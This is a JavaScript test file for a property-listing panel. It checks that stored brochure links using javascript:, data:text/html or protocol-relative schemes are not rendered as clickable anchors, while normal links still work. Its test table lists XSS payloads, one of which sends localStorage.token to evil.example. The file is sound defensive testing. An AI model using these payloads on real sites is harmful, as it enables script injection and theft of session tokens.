// What the property panel does with a link it did not write.
//
// The server refuses to STORE a non-web link now (see server/test/linkScheme.test.js),
// but a validator added at the write path does not clean the rows behind it. Every
// listing saved before that check is still in the database exactly as written, and
// it reaches this panel through the same fetch as a clean one. So the panel has to
// hold the line itself — and this file mounts the real component against a hostile
// row to prove it does, rather than trusting the helper's unit tests to stand in for
// what actually gets rendered.
import test from 'node:test'
import assert from 'node:assert/strict'
import { render, click } from '../test/render.jsx'
import { installBrowser, mockFetch } from '../test/browserEnv.js'
import PropertyDetail from './PropertyDetail.jsx'

const PROPERTY = {
  id: 11,
  title: 'Prestige Lakeside 3BHK',
  property_type: 'apartment',
  status: 'available',
  bhk: 3,
  size_sqft: 1450,
  price_paise: 9500000000,
  locality: 'Baner',
  city: 'Pune',
  notes: '',
}

const routesFor = (property) => ({
  'GET /api/properties/11': property,
  'GET /api/properties/11/analytics': { views: 0, shares: 0, matches: 0 },
  'GET /api/properties/11/syndications': [],
})

function setup(t, property) {
  const env = installBrowser()
  const net = mockFetch(routesFor(property))
  t.after(() => {
    net.restore()
    env.restore()
  })
  return { env, net }
}

const panel = () => <PropertyDetail propertyId={11} onClose={() => {}} onChanged={() => {}} onOpenLead={() => {}} />

// Every anchor the panel renders, so a link can be found by where it points rather
// than by the words on it.
const anchors = (ui) => ui.all((f) => f.type === 'a')
const hrefs = (ui) => anchors(ui).map((a) => a.props.href)

test('a legitimate brochure link is rendered as a working link', async (t) => {
  setup(t, { ...PROPERTY, brochure_url: 'https://cdn.example/floorplan.pdf' })
  const ui = await render(panel())

  const brochure = ui.byText('Open brochure')
  assert.equal(brochure.type, 'a')
  assert.equal(brochure.props.href, 'https://cdn.example/floorplan.pdf')
  // Opening someone else's document must not hand it a handle on our window.
  assert.match(brochure.props.rel, /noopener/)
})

test('an uploaded brochure on our own origin still opens', async (t) => {
  // PUBLIC_BASE_URL is unset in most deployments, so this relative path is what our
  // OWN uploader produces — refusing it would break the brochure feature outright.
  setup(t, { ...PROPERTY, brochure_url: '/uploads/deadbeef.pdf' })
  const ui = await render(panel())

  assert.equal(ui.byText('Open brochure').props.href, '/uploads/deadbeef.pdf')
})

for (const [what, url] of [
  ['a script', 'javascript:fetch("https://evil.example/"+localStorage.token)'],
  ['a script in mixed case', 'JaVaScRiPt:alert(1)'],
  ['a script behind leading whitespace', '  javascript:alert(1)'],
  ['an inline HTML document', 'data:text/html,<script>alert(1)</script>'],
  ['another origin behind a leading slash', '//evil.example/b.pdf'],
]) {
  test(`a stored brochure link that is ${what} is not offered as a link`, async (t) => {
    setup(t, { ...PROPERTY, brochure_url: url })
    const ui = await render(panel())

    // The strong assertion: not "the href was cleaned", but "no anchor anywhere on
    // this panel points there". A link that is merely relabelled is still a link.
    assert.equal(
      hrefs(ui).includes(url),
      false,
      `the panel rendered an <a href> pointing at ${url}`,
    )
    assert.equal(ui.queryByText('Open brochure'), null, 'a hostile link was still offered as a brochure')
  })
}

test('a hostile brochure link does not take the rest of the panel down with it', async (t) => {
  // The listing is still the agent's listing. Refusing the link must not cost them
  // the title, the price or the ability to edit — otherwise the safe thing to do
  // with a bad row is hide it, and the agent never finds out it is there.
  setup(t, { ...PROPERTY, brochure_url: 'javascript:alert(1)' })
  const ui = await render(panel())

  assert.match(ui.text(), /Prestige Lakeside 3BHK/)
  assert.match(ui.text(), /Baner/)
})

test('the edit form shows a bad brochure link as unopenable and still lets it be removed', async (t) => {
  // Clearing the field is the actual repair, and it lives behind Edit. If the guard
  // hid the whole row, the one control that fixes it would go with it.
  setup(t, { ...PROPERTY, brochure_url: 'javascript:alert(1)' })
  const ui = await render(panel())

  await click(ui.byText('Edit', { exact: true }))

  assert.equal(hrefs(ui).includes('javascript:alert(1)'), false, 'the edit form re-offered the hostile link')
  assert.match(ui.text(), /Brochure link can't be opened/)
  assert.notEqual(ui.queryByText('Remove'), null, 'no way left to clear the bad link')
})

test('the edit form links a legitimate brochure normally', async (t) => {
  setup(t, { ...PROPERTY, brochure_url: 'https://cdn.example/b.pdf' })
  const ui = await render(panel())

  await click(ui.byText('Edit', { exact: true }))

  assert.equal(ui.byText('Brochure added — view').props.href, 'https://cdn.example/b.pdf')
  assert.doesNotMatch(ui.text(), /Brochure link can't be opened/)
})
